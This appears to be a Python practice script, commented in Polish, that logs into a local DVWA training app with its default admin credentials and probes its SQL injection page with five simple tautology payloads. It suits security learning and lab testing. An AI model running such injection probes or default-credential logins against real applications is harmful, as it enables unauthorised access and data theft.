import requests
from bs4 import BeautifulSoup

session = requests.Session() #tworzymy sesje http

#zdobycie tokena
login_page = session.get('http://localhost/login.php') #pobieramy strone logowania
soup = BeautifulSoup(login_page.text, 'html.parser') #analizujemy ja
token = soup.find('input', {'name': 'user_token'})['value'] #wyszukujemy tam user_token i zapisujemy jego wartosc


#deklaracja danych logowania do DVWA i tokenu
login_data = {
    'username': 'admin',
    'password': 'password', 
    'Login': 'Login', #nazwa przycisku do logowania
    'user_token': token
}

session.post('http://localhost/login.php', data=login_data) #wysylamy dane logowania na strone

# Lista prostych payloadów SQL Injection
payloads = [
    "1",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
]

#zadeklarowanie strony do testowania na sql
url = 'http://localhost/vulnerabilities/sqli/'


#dla kazdego payloadu...
for payload in payloads:
    params = {'id': payload, 'Submit': 'Submit'} #parametry, ktore wysylamy
    response = session.get(url, params=params) #wyslanie
    if "First name:" in response.text: #prosta analiza odpowiedzi
        print(f"Payload: {payload} prawdopodobnie działa!")
    else:
        print(f"Payload: {payload} nie wykryto podatności.")

